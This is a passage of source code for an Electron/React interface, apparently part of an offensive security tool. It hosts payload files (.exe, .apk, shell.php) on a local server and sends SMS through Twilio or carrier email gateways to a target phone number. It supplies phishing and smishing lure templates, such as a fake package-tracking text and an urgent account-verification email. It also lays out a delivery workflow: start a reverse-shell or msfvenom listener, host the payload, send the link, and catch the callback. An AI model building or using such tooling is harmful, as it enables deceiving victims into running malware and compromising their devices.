                                            <p className="mt-3 text-sm text-red-500 font-medium" role="alert">{liveLinkError}</p>
                                        )}
                                    </>
                                ) : (
                                    <div className="space-y-2">
                                        <p className={`text-sm font-medium ${darkMode ? 'text-cyan-300' : 'text-cyan-700'}`}>Live link ready — use this in &quot;Payload URL&quot; below and send to your iPhone:</p>
                                        <p className="font-mono text-sm break-all">{payloadServerUrl}</p>
                                        <CopyButton text={payloadServerUrl} label="Copy URL" darkMode={darkMode} />
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Host payload — Electron only */}
                        {isElectron && (
                            <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                                <h3 className="font-semibold text-lg mb-3">Host payload (one-click)</h3>
                                <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Choose your payload file (.exe, .apk, etc.), start the server, then use the URL in email/SMS.</p>
                                <div className="flex flex-wrap items-end gap-3 mb-3">
                                    <div>
                                        <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Payload file</label>
                                        <div className="flex gap-2">
                                            <button
                                                type="button"
                                                onClick={async () => {
                                                    try {
                                                        const res = await (window as any).ipcRenderer.invoke('show-open-dialog', { title: 'Choose payload file', filters: [{ name: 'Payloads', extensions: ['exe', 'apk', 'php', 'pdf', 'doc', 'docx', 'zip'] }, { name: 'All', extensions: ['*'] }] });
                                                        if (!res.canceled && res.filePaths?.[0]) setPayloadFilePath(res.filePaths[0]);
                                                    } catch { /* ignore */ }
                                                }}
                                                className={`px-3 py-2 rounded-lg text-sm font-medium ${darkMode ? 'bg-gray-700 hover:bg-gray-600 text-gray-200' : 'bg-gray-200 hover:bg-gray-300 text-gray-800'}`}
                                            >
                                                Choose file
                                            </button>
                                            <span className={`text-sm font-mono truncate max-w-xs ${darkMode ? 'text-gray-400' : 'text-gray-600'}`} title={payloadFilePath}>{payloadFilePath ? payloadFilePath.replace(/^.*[/\\]/, '') : 'None'}</span>
                                        </div>
                                    </div>
                                    <div>
                                        <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Port</label>
                                        <input type="number" min={1} max={65535} value={payloadServerPort} onChange={e => setPayloadServerPort(parseInt(e.target.value, 10) || 8080)} className={`w-20 px-2 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                    </div>
                                    <div>
                                        <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>LHOST (for URL)</label>
                                        <input type="text" value={lhost} onChange={e => setLhost(e.target.value)} className={`w-36 px-2 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} placeholder="10.10.14.1" />
                                    </div>
                                </div>
                                {!payloadServerUrl ? (
                                    <>
                                        <button
                                            type="button"
                                            disabled={!payloadFilePath || hostPayloadLoading}
                                            onClick={async () => {
                                                if (!payloadFilePath) return;
                                                setHostPayloadError(null);
                                                setHostPayloadLoading(true);
                                                try {
                                                    const res = await (window as any).ipcRenderer.invoke('start-payload-server', { port: payloadServerPort, filePath: payloadFilePath, lhost });
                                                    if (res.success && res.url) {
                                                        setPayloadServerUrl(res.url);
                                                        setPayloadUrl(res.url);
                                                    } else {
                                                        setHostPayloadError(res.error || 'Failed to start server');
                                                    }
                                                } catch (e) {
                                                    setHostPayloadError(e instanceof Error ? e.message : 'Failed to start server');
                                                } finally {
                                                    setHostPayloadLoading(false);
                                                }
                                            }}
                                            className={`px-4 py-2 rounded-lg text-sm font-medium flex items-center gap-2 ${!payloadFilePath || hostPayloadLoading ? 'opacity-50 cursor-not-allowed bg-gray-500 text-white' : (darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white')}`}
                                        >
                                            {hostPayloadLoading ? <><Loader2 size={14} className="animate-spin" /> Starting…</> : <>Start server</>}
                                        </button>
                                        {hostPayloadError && (
                                            <p className="mt-2 text-sm text-red-500 font-medium" role="alert">{hostPayloadError}</p>
                                        )}
                                    </>
                                ) : (
                                    <div className="space-y-2">
                                        <p className={`text-sm font-medium ${darkMode ? 'text-cyan-400' : 'text-cyan-600'}`}>Serving at: <a href={payloadServerUrl} target="_blank" rel="noopener noreferrer" className="font-mono underline">{payloadServerUrl}</a></p>
                                        <CopyButton text={payloadServerUrl} label="Copy URL" darkMode={darkMode} />
                                        <button type="button" onClick={async () => { try { await (window as any).ipcRenderer.invoke('stop-payload-server'); setPayloadServerUrl(null); } catch { /* ignore */ } }} className={`ml-2 px-3 py-1.5 rounded-lg text-sm ${darkMode ? 'bg-red-600/80 hover:bg-red-500 text-white' : 'bg-red-500 hover:bg-red-600 text-white'}`}>Stop server</button>
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Send via Email-to-SMS (no Twilio) — carrier gateway + your email */}
                        {isElectron && (
                            <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800/80 border-cyan-500/40' : 'bg-cyan-50/50 border-cyan-200'}`}>
                                <h3 className="font-semibold text-lg mb-2">Send via Email-to-SMS (no Twilio)</h3>
                                <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                    Use your own email (Gmail, Outlook, etc.) to send a text via carrier gateways. Pick the recipient&apos;s carrier, enter their number and your SMTP details. No paid SMS API needed.
                                </p>
                                <div className="grid gap-3 max-w-xl mb-3">
                                    <div className="grid grid-cols-2 gap-3">
                                        <div>
                                            <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Carrier</label>
                                            <select value={emailCarrier} onChange={e => setEmailCarrier(e.target.value)} className={`w-full px-3 py-2 rounded-lg text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}>
                                                <option value="tmobile">T-Mobile</option>
                                                <option value="att">AT&amp;T</option>
                                                <option value="verizon">Verizon</option>
                                                <option value="uscellular">U.S. Cellular</option>
                                                <option value="cricket">Cricket</option>
                                                <option value="boost">Boost Mobile</option>
                                                <option value="other">Other (custom)</option>
                                            </select>
                                        </div>
                                        <div>
                                            <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>To (phone number)</label>
                                            <input type="text" value={smsTo} onChange={e => setSmsTo(e.target.value)} placeholder="5551234567" className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                        </div>
                                    </div>
                                    {emailCarrier === 'other' && (
                                        <div>
                                            <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Custom gateway domain (e.g. vtext.com)</label>
                                            <input type="text" value={emailCustomGateway} onChange={e => setEmailCustomGateway(e.target.value)} placeholder="vtext.com" className={`w-full max-w-xs px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                        </div>
                                    )}
                                    <div className="grid grid-cols-2 gap-3">
                                        <div>
                                            <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>SMTP host</label>
                                            <input type="text" value={emailSmtpHost} onChange={e => setEmailSmtpHost(e.target.value)} placeholder="smtp.gmail.com" className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                        </div>
                                        <div>
                                            <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>SMTP port</label>
                                            <input type="number" value={emailSmtpPort} onChange={e => setEmailSmtpPort(parseInt(e.target.value, 10) || 587)} className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                        </div>
                                    </div>
                                    <div>
                                        <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Email (SMTP user)</label>
                                        <input type="text" value={emailSmtpUser} onChange={e => setEmailSmtpUser(e.target.value)} placeholder="you@gmail.com" className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                    </div>
                                    <div>
                                        <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>App password (Gmail: use App Password, not regular password)</label>
                                        <input type="password" value={emailSmtpPass} onChange={e => setEmailSmtpPass(e.target.value)} placeholder="••••••••" className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                    </div>
                                    <p className={`text-xs ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Message and Payload URL below are shared with Twilio. Use [LINK] in the message and it will be replaced.</p>
                                </div>
                                <div className="flex items-center gap-3">
                                    <button
                                        type="button"
                                        disabled={emailSending || !emailSmtpUser || !emailSmtpPass || !smsTo.trim() || !smsBody.trim()}
                                        onClick={async () => {
                                            setEmailResult(null);
                                            setEmailSending(true);
                                            const body = smsBody.replace(/\[LINK\]/g, payloadUrl.trim() || '[LINK]');
                                            const digits = smsTo.replace(/\D/g, '');
                                            const gateways: Record<string, string> = { tmobile: 'tmomail.net', att: 'txt.att.net', verizon: 'vtext.com', uscellular: 'email.uscc.net', cricket: 'sms.cricketwireless.net', boost: 'smsmyboostmobile.com' };
                                            const domain = emailCarrier === 'other' ? (emailCustomGateway.trim() || 'tmomail.net') : (gateways[emailCarrier] || 'tmomail.net');
                                            const toAddress = digits ? `${digits}@${domain}` : '';
                                            if (!toAddress) { setEmailResult({ ok: false, message: 'Enter a valid phone number' }); setEmailSending(false); return; }
                                            try {
                                                const res = await (window as any).ipcRenderer.invoke('send-sms-email', {
                                                    smtpHost: emailSmtpHost.trim(),
                                                    smtpPort: emailSmtpPort || 587,
                                                    smtpUser: emailSmtpUser.trim(),
                                                    smtpPass: emailSmtpPass,
                                                    from: (emailFrom || emailSmtpUser).trim(),
                                                    toAddress,
                                                    subject: 'Message',
                                                    body
                                                });
                                                if (res.success) { setEmailResult({ ok: true, message: `Sent (${res.messageId || 'ok'})` }); } else { setEmailResult({ ok: false, message: res.error || 'Send failed' }); }
                                            } catch (e) { setEmailResult({ ok: false, message: e instanceof Error ? e.message : 'Send failed' }); }
                                            setEmailSending(false);
                                        }}
                                        className={`px-4 py-2 rounded-lg text-sm font-medium flex items-center gap-2 ${(emailSending || !emailSmtpUser || !emailSmtpPass || !smsTo.trim() || !smsBody.trim()) ? 'opacity-50 cursor-not-allowed bg-gray-500 text-white' : (darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white')}`}
                                    >
                                        {emailSending ? <><Loader2 size={16} className="animate-spin" /> Sending…</> : <>Send via Email-to-SMS</>}
                                    </button>
                                    {emailResult && <span className={`text-sm ${emailResult.ok ? (darkMode ? 'text-green-400' : 'text-green-600') : (darkMode ? 'text-red-400' : 'text-red-600')}`}>{emailResult.message}</span>}
                                </div>
                            </div>
                        )}

                        {/* Send SMS (Twilio) */}
                        <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                            <h3 className="font-semibold text-lg mb-3">Send SMS to target (Twilio)</h3>
                            <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                Or use Twilio if you have an account. Enter your Twilio credentials (saved in this browser). Target can be prefilled from Start here if you entered a phone number.
                                {payloadServerUrl && <span className={`block mt-2 font-medium ${darkMode ? 'text-cyan-400' : 'text-cyan-600'}`}>Your live test link is in Payload URL below — enter your iPhone number in To and click Send SMS to test.</span>}
                            </p>
                            <div className="grid gap-3 max-w-xl">
                                <div>
                                    <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Twilio Account SID</label>
                                    <input type="text" value={twilioSid} onChange={e => { setTwilioSid(e.target.value); try { localStorage.setItem('strix-twilio-sid', e.target.value); } catch { } }} placeholder="AC..." className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                </div>
                                <div>
                                    <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Twilio Auth Token</label>
                                    <input type="password" value={twilioToken} onChange={e => { setTwilioToken(e.target.value); try { localStorage.setItem('strix-twilio-token', e.target.value); } catch { } }} placeholder="..." className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                </div>
                                <div>
                                    <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>From (Twilio phone number, e.g. +1234567890)</label>
                                    <input type="text" value={twilioFrom} onChange={e => { setTwilioFrom(e.target.value); try { localStorage.setItem('strix-twilio-from', e.target.value); } catch { } }} placeholder="+1..." className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                </div>
                                <div>
                                    <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>To (target phone number)</label>
                                    <input type="text" value={smsTo} onChange={e => setSmsTo(e.target.value)} placeholder="+1234567890" className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                </div>
                                <div>
                                    <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Payload URL (used to replace [LINK] in message)</label>
                                    <p className={`text-xs mb-2 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Default links — click to use (uses your LHOST and port {payloadServerPort}):</p>
                                    <div className="flex flex-wrap gap-2 mb-2">
                                        {[
                                            { label: 'payload.exe', path: 'payload.exe' },
                                            { label: 'payload.apk', path: 'payload.apk' },
                                            { label: 'shell.php', path: 'shell.php' },
                                            { label: 'test.html', path: 'test.html' },
                                            { label: 'payload.elf', path: 'payload.elf' },
                                        ].map(({ label, path }) => {
                                            const url = `http://${lhost || 'YOUR_IP'}:${payloadServerPort}/${path}`;
                                            return (
                                                <button
                                                    key={path}
                                                    type="button"
                                                    onClick={() => setPayloadUrl(url)}
                                                    className={`px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors ${darkMode ? 'bg-gray-700 border-gray-600 text-gray-200 hover:bg-gray-600' : 'bg-gray-100 border-gray-300 text-gray-700 hover:bg-gray-200'}`}
                                                >
                                                    {label}
                                                </button>
                                            );
                                        })}
                                    </div>
                                    <input type="text" value={payloadUrl} onChange={e => setPayloadUrl(e.target.value)} placeholder="http://10.10.14.1:8080/payload.exe" className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                </div>
                                <div>
                                    <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Message (use [LINK] and it will be replaced)</label>
                                    <textarea value={smsBody} onChange={e => setSmsBody(e.target.value)} rows={3} className={`w-full px-3 py-2 rounded-lg font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} placeholder="Your package is ready. Track here: [LINK]" />
                                </div>
                                <div className="flex items-center gap-3">
                                    <button
                                        type="button"
                                        disabled={smsSending || !twilioSid || !twilioToken || !twilioFrom || !smsTo.trim() || !smsBody.trim()}
                                        onClick={async () => {
                                            setSmsResult(null);
                                            setSmsSending(true);
                                            const body = smsBody.replace(/\[LINK\]/g, payloadUrl.trim() || '[LINK]');
                                            try {
                                                const res = await (window as any).ipcRenderer.invoke('send-sms-twilio', {
                                                    accountSid: twilioSid.trim(),
                                                    authToken: twilioToken.trim(),
                                                    from: twilioFrom.trim(),
                                                    to: smsTo.trim(),
                                                    body
                                                });
                                                if (res.success) {
                                                    setSmsResult({ ok: true, message: `SMS sent (SID: ${res.sid || 'ok'})` });
                                                } else {
                                                    setSmsResult({ ok: false, message: res.error || 'Send failed' });
                                                }
                                            } catch (e) {
                                                setSmsResult({ ok: false, message: e instanceof Error ? e.message : 'Send failed' });
                                            }
                                            setSmsSending(false);
                                        }}
                                        className={`px-4 py-2 rounded-lg text-sm font-medium flex items-center gap-2 ${(smsSending || !twilioSid || !twilioToken || !twilioFrom || !smsTo.trim() || !smsBody.trim()) ? 'opacity-50 cursor-not-allowed bg-gray-500 text-white' : (darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white')}`}
                                    >
                                        {smsSending ? <><Loader2 size={16} className="animate-spin" /> Sending…</> : <>Send SMS</>}
                                    </button>
                                    {smsResult && <span className={`text-sm ${smsResult.ok ? (darkMode ? 'text-green-400' : 'text-green-600') : (darkMode ? 'text-red-400' : 'text-red-600')}`}>{smsResult.message}</span>}
                                </div>
                            </div>
                        </div>

                        <h3 className="font-semibold text-lg">1. Email phishing</h3>
                        <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                            <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Template — replace [LINK] with your payload URL (e.g. https://your-server.com/payload.exe or shortened link).</p>
                            <pre className={`p-3 rounded-lg border font-mono text-sm whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`Subject: [Urgent] Action required – verify your account

Hi,

Please click the link below to verify your account / update your details / claim your reward:

[LINK]

If you did not request this, please ignore this email.

Best regards`}
                            </pre>
                            <CopyButton text={'Subject: [Urgent] Action required – verify your account\n\nHi,\n\nPlease click the link below to verify your account:\n[LINK]\n\nBest regards'} label="Copy email template" darkMode={darkMode} />
                        </div>

                        <h3 className="font-semibold text-lg">2. SMS phishing (smishing)</h3>
                        <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                            <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Short message — replace [LINK] with your payload URL. Send via your SMS gateway or tool (e.g. Twilio, gophish, set). Target: phone number from Start here workflow.</p>
                            <pre className={`p-3 rounded-lg border font-mono text-sm ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`Your package is ready. Track here: [LINK]`}
                            </pre>
                            <p className={`text-xs mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Alternatives: &quot;Your account needs verification: [LINK]&quot; / &quot;You have a refund: [LINK]&quot;</p>
                            <CopyButton text="Your package is ready. Track here: [LINK]" label="Copy SMS template" darkMode={darkMode} />
                        </div>

                        <h3 className="font-semibold text-lg">3. Payload delivery workflow</h3>
                        <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                            <ol className={`list-decimal list-inside space-y-2 text-sm ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                <li>Start listener (Reverse Shells or Msfvenom handler).</li>
                                <li>Generate payload (Msfvenom .exe/.apk or Reverse Shell one-liner for web).</li>
                                <li>Host file: <code className={`font-mono text-xs px-1.5 py-0.5 rounded ${darkMode ? 'bg-gray-700' : 'bg-gray-200'}`}>python3 -m http.server 8080</code> or upload to a server; shorten link if needed.</li>
                                <li>Send [LINK] to target via email/SMS using templates above.</li>
                                <li>When target clicks/runs, you get a callback on your listener.</li>
                            </ol>
                            <p className={`text-xs mt-3 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>For mobile (APK): use Msfvenom Android payload, host the .apk, send link. For vishing (voice), use a separate tool (e.g. call spoofing + social engineering).</p>
                        </div>

                        <p className={`text-xs ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Use <strong>Reverse Shells</strong> or <strong>Msfvenom</strong> in the sidebar to build payloads; use <strong>Start here</strong> to set LHOST/LPORT and target (IP, domain, or phone number for SMS).</p>
                    </div>
                )}
            </div>
        </div>
    );
}
